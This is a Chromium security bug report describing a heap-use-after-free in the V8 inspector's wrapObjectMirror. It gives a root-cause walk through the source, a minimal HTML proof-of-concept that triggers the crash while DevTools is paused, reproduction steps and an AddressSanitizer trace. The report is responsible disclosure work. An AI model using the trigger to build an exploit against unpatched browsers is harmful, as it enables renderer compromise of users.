# Heap-use-after-free in v8_inspector::InjectedScript::wrapObjectMirror due to context destruction in JS callback

| Field | Value |
|-------|-------|
| **Issue ID** | [503553614](https://issues.chromium.org/issues/503553614) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | al...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2026-04-17 |
| **Bounty** | $3,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

## VULNERABILITY DETAILS

Please provide a brief explanation of the security issue.

## Summary

Heap-use-after-free in `InjectedScript::wrapObjectMirror`. The `v8_inspector::InjectedScript` object is freed when its owning `InspectedContext` is destroyed during a synchronous JavaScript callback. The freed allocation is a renderer-heap object reclaimable from controlled JavaScript, exploitable for renderer code execution with a crafted vtable.

Minimal testcase:

```
<iframe srcdoc="<script>
setTimeout(function(){
  Error.prepareStackTrace=function(){self.frameElement.remove();return''};
  (function(){var e=new Error;debugger})()
},500)
</script>"></iframe>

```
## Analysis

Chrome DevTools exposes the `Runtime` CDP domain through the V8 inspector. Value wrapping and expression evaluation are handled by `InjectedScript`, a per-session scripting interface that produces `RemoteObject`s for the frontend. Each `InjectedScript` is scoped to a single JS context, which the inspector tracks as an `InspectedContext`. The `InspectedContext` owns all `InjectedScript` instances associated with that context.

`InjectedScript` instances are stored as `unique_ptr` values in `InspectedContext::m_injectedScripts` ([inspected-context.h:86](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/inspected-context.h;l=86)):

```
// inspected-context.h:70
class InspectedContext {
  [...]
 private:
  [...]
  std::unordered_map<int, std::unique_ptr<InjectedScript>> m_injectedScripts;  // line 86
  [...]
};

```

The inspector session obtains a raw pointer via `findInjectedScript` ([v8-inspector-session-impl.cc:229](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/v8-inspector-session-impl.cc;l=229)):

```
// v8-inspector-session-impl.cc:229
Response V8InspectorSessionImpl::findInjectedScript(
    int contextId, InjectedScript*& injectedScript) {
  injectedScript = nullptr;
  std::shared_ptr<InspectedContext> context =       // local shared_ptr
      m_inspector->getContext(m_contextGroupId, contextId);
  if (!context)
    return Response::ServerError("Cannot find context with specified id");
  injectedScript = context->getInjectedScript(m_sessionId);
  if (!injectedScript) {
    injectedScript = context->createInjectedScript(m_sessionId);
    [...]
  }
  return Response::Success();
}  // shared_ptr destroyed here — no owner remains

```

The `shared_ptr<InspectedContext>` exists only for the duration of this function. The caller receives a raw `InjectedScript*` and stores it in the `Scope` object ([injected-script.h:174](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/injected-script.h;l=174)):

```
// injected-script.h:78
class InjectedScript final {
  [...]
  class Scope {  // line 154
    [...]
   protected:
    V8InspectorImpl* m_inspector;
    InjectedScript* m_injectedScript;   // raw pointer — no shared_ptr<InspectedContext>
    [...]
  };
  [...]
};

```

Once `findInjectedScript` returns, nothing holds the `InspectedContext` alive. `InjectedScript` is `unique_ptr`-owned by `InspectedContext`, so destroying the context frees the `InjectedScript` with it. The vulnerability window is any wrapping operation that can reach user JavaScript while the raw `InjectedScript*` is live. `wrapObject` is one such site ([injected-script.cc:610](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/injected-script.cc;l=610)):

```
// injected-script.cc:610
Response InjectedScript::wrapObject(
    v8::Local<v8::Value> value, const String16& groupName,
    const WrapOptions& wrapOptions,
    v8::MaybeLocal<v8::Value> customPreviewConfig, int maxCustomPreviewDepth,
    std::unique_ptr<protocol::Runtime::RemoteObject>* result) {
  v8::Local<v8::Context> context = m_context->context();  // valid use
  v8::Context::Scope contextScope(context);
  std::unique_ptr<ValueMirror> mirror = ValueMirror::create(context, value);  // ← sync JS entry
  if (!mirror) return Response::InternalError();
  return wrapObjectMirror(*mirror, groupName, wrapOptions, customPreviewConfig,
                          maxCustomPreviewDepth, result);  // ← UAF site
}

```

The PoC demonstrates a scenario where DevTools sends `Runtime.getProperties` while paused in the iframe context. `getProperties` builds property mirrors for the paused scope's local variables, then calls `wrapObjectMirror` directly for each ([injected-script.cc:450](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/injected-script.cc;l=450)):

```
// injected-script.cc:440
for (const PropertyMirror& mirror : mirrors) {
  [...]
  if (mirror.value) {
    Response response = wrapObjectMirror(
        *mirror.value, groupName, wrapOptions, v8::MaybeLocal<v8::Value>(),
        kMaxCustomPreviewDepth, &remoteObject);
    [...]
  }
  [...]
}

```

`wrapObjectMirror` calls `ValueMirror::getProperties` to enumerate the object's properties. Inside that loop, each property's value mirror is created via `ValueMirror::create` ([value-mirror.cc:1613](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/value-mirror.cc;l=1613)):

```
// value-mirror.cc:1613
if (!descriptor.value.IsEmpty()) {
  valueMirror = ValueMirror::create(context, descriptor.value);  // ← escape point
}

```

For the local Error variable, `descriptor.value` is the Error object. `ValueMirror::create` dispatches to `descriptionForError` for `IsNativeError()` values ([value-mirror.cc:1807](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/value-mirror.cc;l=1807)):

```
// value-mirror.cc:1807
std::unique_ptr<ValueMirror> ValueMirror::create(v8::Local<v8::Context> context,
                                                 v8::Local<v8::Value> value) {
  [...]
  if (!value->IsObject()) return nullptr;
  v8::Local<v8::Object> object = value.As<v8::Object>();
  [...]
  if (object->IsNativeError()) {
    return std::make_unique<ObjectMirror>(object,
                                          RemoteObject::SubtypeEnum::Error,
                                          descriptionForError(context, object));
  }
  [...]
}

```

`descriptionForError` builds the display string, reading `.name`, `.message`, and `.stack` from the Error object. The `.stack` read is where control reaches user JavaScript ([value-mirror.cc:305](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/value-mirror.cc;l=305)):

```
// value-mirror.cc:305
String16 descriptionForError(v8::Local<v8::Context> context,
                             v8::Local<v8::Object> object) {
  [...]
  {
    v8::Local<v8::Value> stackValue;
    if (getErrorProperty(context, object, toV8String(isolate, "stack"))
            .ToLocal(&stackValue) && stackValue->IsString()) { [...] }
  }
  [...]
}

```

Note that `getErrorProperty` attempts to prevent user code execution by checking whether the property is backed by a user-defined getter ([value-mirror.cc:261](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/value-mirror.cc;l=261)), which my testcase bypasses:

```
// value-mirror.cc:261
v8::MaybeLocal<v8::Value> getErrorProperty(v8::Local<v8::Context> context,
                                           v8::Local<v8::Object> object,
                                           v8::Local<v8::String> name) {
  v8::Isolate* isolate = v8::Isolate::GetCurrent();
  v8::TryCatch tryCatch(isolate);
  v8::MicrotasksScope microtasksScope(context,
                                      v8::MicrotasksScope::kDoNotRunMicrotasks);
  v8::Local<v8::Value> descriptor;
  if (!object->GetOwnPropertyDescriptor(context, name).ToLocal(&descriptor)) {
    tryCatch.Reset();
    return object->Get(context, name);
  }
  if (!descriptor->IsObject()) return object->Get(context, name);

  v8::Local<v8::Object> descriptorObject = descriptor.As<v8::Object>();
  v8::Local<v8::Value> getDescriptor;
  if (!descriptorObject->HasOwnProperty(context, toV8String(isolate, "get"))
           .FromJust()) {
    tryCatch.Reset();
    return object->Get(context, name);
  }
  if (!descriptorObject->Get(context, toV8String(isolate, "get"))
           .ToLocal(&getDescriptor)) {
    tryCatch.Reset();
    return object->Get(context, name);
  }

  if (getDescriptor->IsFunction()) {
    v8::Local<v8::Function> function = getDescriptor.As<v8::Function>();
    if (deepBoundFunction(function)->ScriptId() !=
        v8::UnboundScript::kNoScriptId) {
      return v8::MaybeLocal<v8::Value>();  // skip user-defined getters
    }
  }

  return object->Get(context, name);  // (→ ErrorStackGetter)
}

```

The function installs a `kDoNotRunMicrotasks` scope and tries to detect user-defined getters by checking the getter's `ScriptId`: if it is not `kNoScriptId`, it belongs to user code and is skipped. However, `.stack` on a native `Error` is not a user-defined getter — it is a `FunctionTemplate`-backed C++ accessor installed by V8 at bootstrap, which carries no script ID. The guard evaluates to false, and the function falls through to `object->Get(context, name)`.

The `stack` property is installed on every `Error` subtype's initial map as an `AccessorPair` backed by a `FunctionTemplate` ([bootstrapper.cc:1582](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/init/bootstrapper.cc;l=1582)):

```
// bootstrapper.cc:1582
{  // stack
  DirectHandle<AccessorPair> new_pair = factory->NewAccessorPair();
  new_pair->set_getter(*factory->error_stack_getter_fun_template());
  new_pair->set_setter(*factory->error_stack_setter_fun_template());
  Descriptor d = Descriptor::AccessorConstant(factory->stack_string(),
                                              new_pair, DONT_ENUM);
  initial_map->AppendDescriptor(isolate, &d);
}

```

The getter template wraps `Accessors::ErrorStackGetter` ([setup-heap-internal.cc:1527](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/heap/setup-heap-internal.cc;l=1527)):

```
// setup-heap-internal.cc:1527
// Error.stack accessor callbacks and their SharedFunctionInfos:
{
  function_template = ApiNatives::CreateAccessorFunctionTemplateInfo(
      isolate_, Accessors::ErrorStackGetter, 0,
      SideEffectType::kHasSideEffect);
  [...]
  set_error_stack_getter_fun_template(*function_template);
}

```

`ErrorStackGetter` calls `ErrorUtils::GetFormattedStack` → `FormatStackTrace`, which invokes the user-supplied `Error.prepareStackTrace` synchronously ([accessors.cc:905](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/builtins/accessors.cc;l=905)):

```
// accessors.cc:905
void Accessors::ErrorStackGetter(
    const v8::FunctionCallbackInfo<v8::Value>& info) {
  [...]
  if (IsJSObject(*maybe_error_object)) {
    if (!ErrorUtils::GetFormattedStack(isolate,
                                       Cast<JSObject>(maybe_error_object))
             .ToHandle(&formatted_stack)) {
      return;
    }
  }
  [...]
}

```

The `kDoNotRunMicrotasks` scope provides no protection here — microtask suppression does not prevent synchronous C++ callbacks from calling into user JavaScript.

The user's `prepareStackTrace` callback calls `self.frameElement.remove()`. This triggers a synchronous frame detach in Blink, which reaches the V8 inspector's context teardown freeing the object. Call flow:

```
→ V8InspectorImpl::contextDestroyed             (v8-inspector-impl.cc:303)
  → contextCollected                            (v8-inspector-impl.cc:309)
    → discardInspectedContext                   (v8-inspector-impl.cc:441)
      → m_contexts[groupId]->erase(contextId)  // map ref dropped; 2 locals still alive
    ← discardInspectedContext returns           // its shared_ptr dies → refcount 1
  ← contextCollected returns                   // its shared_ptr dies → refcount 0
    → ~InspectedContext                         (inspected-context.cc:105)
      → ~m_injectedScripts                      // unordered_map<int, unique_ptr<InjectedScript>>
        → ~InjectedScript                       ← freed

```

When `prepareStackTrace` returns, execution unwinds back through `FormatStackTrace` → `ErrorStackGetter` → `object->Get` → `getErrorProperty` → `descriptionForError` → `ValueMirror::create`, and arrives back in `wrapObject` ([injected-script.cc:610](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/injected-script.cc;l=610)):

```
// injected-script.cc:610
Response InjectedScript::wrapObject(...) {
  [...]
  std::unique_ptr<ValueMirror> mirror = ValueMirror::create(context, value);  // returns here
  if (!mirror) return Response::InternalError();
  return wrapObjectMirror(*mirror, ...);  // method call on freed `this`
}

```

`wrapObjectMirror` reads `m_customPreviewEnabled` and `m_sessionId` from the freed object, then dereferences `m_context` ([injected-script.cc:623](https://source.chromium.org/chromium/chromium/src/+/refs/tags/149.0.7779.3:v8/src/inspector/injected-script.cc;l=623)):

```
// injected-script.cc:623
Response InjectedScript::wrapObjectMirror(...) {
  int customPreviewEnabled = m_customPreviewEnabled;
  int sessionId = m_sessionId;
  v8::Local<v8::Context> context = m_context->context();  // UAF: this and m_context freed

```

This causes a re-use of unowned memory behind the freed `InjectedScript` object.

## VERSION

Chrome Version: 149.0.7779.0 (Developer Build with AddressSanitizer) (arm64)  

Operating System: macOS Version 15.6 (Build 24G84)

## REPRODUCTION CASE

Please include a demonstration of the security bug, such as an attached HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE make the file as small as possible and remove any content not required to demonstrate the bug, or any personal or confidential information.

Steps to reproduce

1. python server.py
2. Open DevTools in Chrome
3. Navigate to localhost:8080/poc.html

Expectation: instant crash under asan (Sad Tab), 100% reliable

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION  

Type of crash: renderer process  

Crash State:

```
=================================================================
==7173==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110000e9948 at pc 0x000306717170 bp 0x00016f8a0290 sp 0x00016f8a0288
READ of size 1 at 0x6110000e9948 thread T0
==7173==WARNING: invalid path to external symbolizer!
==7173==WARNING: Failed to use and restart external symbolizer!
    #0 0x00030671716c in v8_inspector::InjectedScript::wrapObjectMirror(v8_inspector::ValueMirror const&, v8_inspector::String16 const&, v8_inspector::WrapOptions const&, v8::MaybeLocal<v8::Value>, int, std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::RemoteObject, std::__Cr::default_delete<v8_inspector::protocol::Runtime::RemoteObject>>*)+0xbfc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x671716c)
    #1 0x0003067150e8 in v8_inspector::InjectedScript::getProperties(v8::Local<v8::Object>, v8_inspector::String16 const&, bool, bool, bool, v8_inspector::WrapOptions const&, std::__Cr::unique_ptr<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>>>, std::__Cr::default_delete<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>>>>>*, std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::ExceptionDetails, std::__Cr::default_delete<v8_inspector::protocol::Runtime::ExceptionDetails>>*)+0x504 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67150e8)
    #2 0x0003067ecb54 in v8_inspector::V8RuntimeAgentImpl::getProperties(v8_inspector::String16 const&, std::__Cr::optional<bool>, std::__Cr::optional<bool>, std::__Cr::optional<bool>, std::__Cr::optional<bool>, std::__Cr::unique_ptr<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>>>, std::__Cr::default_delete<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PropertyDescriptor>>>>>>*, std::__Cr::unique_ptr<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::InternalPropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::InternalPropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::InternalPropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::InternalPropertyDescriptor>>>>, std::__Cr::default_delete<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::InternalPropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::InternalPropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::InternalPropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::InternalPropertyDescriptor>>>>>>*, std::__Cr::unique_ptr<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor>>>>, std::__Cr::default_delete<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor, std::__Cr::default_delete<v8_inspector::protocol::Runtime::PrivatePropertyDescriptor>>>>>>*, std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::ExceptionDetails, std::__Cr::default_delete<v8_inspector::protocol::Runtime::ExceptionDetails>>*)+0x2c4 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67ecb54)
    #3 0x0003066fe948 in v8_inspector::protocol::Runtime::DomainDispatcherImpl::getProperties(v8_crdtp::Dispatchable const&)+0x2b0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x66fe948)
    #4 0x000306833890 in v8_crdtp::UberDispatcher::DispatchResult::Run()+0x74 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x6833890)
    #5 0x0003067d7f48 in v8_inspector::V8InspectorSessionImpl::dispatchProtocolMessage(v8_inspector::StringView)+0x3cc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67d7f48)
    #6 0x00031e6bee58 in blink::DevToolsSession::DispatchProtocolCommandImpl(int, blink::String const&, base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>)+0x3cc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1e6bee58)
    #7 0x00031e6bf438 in non-virtual thunk to blink::DevToolsSession::DispatchProtocolCommand(int, blink::String const&, base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>)+0x19c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1e6bf438)
    #8 0x00030c40f52c in blink::mojom::blink::DevToolsSessionStubDispatch::Accept(blink::mojom::blink::DevToolsSession*, mojo::Message*)+0x290 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0xc40f52c)
    #9 0x000312accf04 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x8fc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12accf04)
    #10 0x000312ae1ebc in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12ae1ebc)
    #11 0x000312ad20f8 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12ad20f8)
    #12 0x0003160e50a4 in IPC::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification)+0x3e8 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x160e50a4)
    #13 0x0003160e70c8 in base::internal::Invoker<base::internal::FunctorTraits<void (IPC::ChannelAssociatedGroupController::*&&)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), IPC::ChannelAssociatedGroupController*&&, mojo::Message&&, IPC::(anonymous namespace)::ScopedUrgentMessageNotification&&>, base::internal::BindState<true, true, false, void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification>, void ()>::RunOnce(base::internal::BindStateBase*)+0x1bc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x160e70c8)
    #14 0x000312cc483c in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12cc483c)
    #15 0x000312d2c508 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2c508)
    #16 0x000312d2b8c0 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2b8c0)
    #17 0x000312bab74c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+0x228 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12bab74c)
    #18 0x000312d2d8bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x380 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2d8bc)
    #19 0x000312c51a8c in base::RunLoop::Run(base::Location const&)+0x430 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12c51a8c)
    #20 0x00031c78ea10 in content::(anonymous namespace)::NestedMessageLoopRunnerImpl::Run()+0x198 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c78ea10)
    #21 0x0003210f9f98 in blink::ClientMessageLoopAdapter::RunLoop(blink::WebLocalFrameImpl*)+0x568 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x210f9f98)
    #22 0x00030679d7bc in v8_inspector::V8Debugger::handleProgramBreak(v8::Local<v8::Context>, v8::Local<v8::Value>, std::__Cr::vector<int, std::__Cr::allocator<int>> const&, v8::base::EnumSet<v8::debug::BreakReason, int>, v8::debug::ExceptionType, bool)+0x6b0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x679d7bc)
    #23 0x0003046889d4 in v8::internal::Debug::OnDebugBreak(v8::internal::DirectHandle<v8::internal::FixedArray>, v8::internal::StepAction, v8::base::EnumSet<v8::debug::BreakReason, int>)+0x594 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x46889d4)
    #24 0x0003046a0cb0 in v8::internal::Debug::HandleDebugBreak(v8::internal::IgnoreBreakMode, v8::base::EnumSet<v8::debug::BreakReason, int>)+0x814 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x46a0cb0)
    #25 0x0003056892e0 in v8::internal::Runtime_HandleDebuggerStatement(int, unsigned long*, v8::internal::Isolate*)+0x9c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x56892e0)
    #26 0x0003f7e7bd48  (<unknown module>)
    #27 0x0003f7f87cb8  (<unknown module>)
    #28 0x0003f7dce344  (<unknown module>)
    #29 0x0003f7dce344  (<unknown module>)
    #30 0x0003f7dcb340  (<unknown module>)
    #31 0x0003f7dcb038  (<unknown module>)
    #32 0x0003047705c4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&)+0x1b90 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x47705c4)
    #33 0x00030476e9a0 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>)+0x170 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x476e9a0)
    #34 0x0003043b141c in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*)+0x3a0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x43b141c)
    #35 0x00031c8e5f78 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*)+0x590 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c8e5f78)
    #36 0x000321221b38 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*)+0x210 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x21221b38)
    #37 0x0003212365c8 in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&)+0x534 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x212365c8)
    #38 0x000321236d58 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&)+0x184 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x21236d58)
    #39 0x0003221f2530 in blink::ScheduledAction::Execute(blink::ExecutionContext*)+0x45c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x221f2530)
    #40 0x0003221f7b28 in blink::DOMTimer::Fired()+0x500 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x221f7b28)
    #41 0x00032044613c in blink::TimerBase::RunInternal()+0xb0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x2044613c)
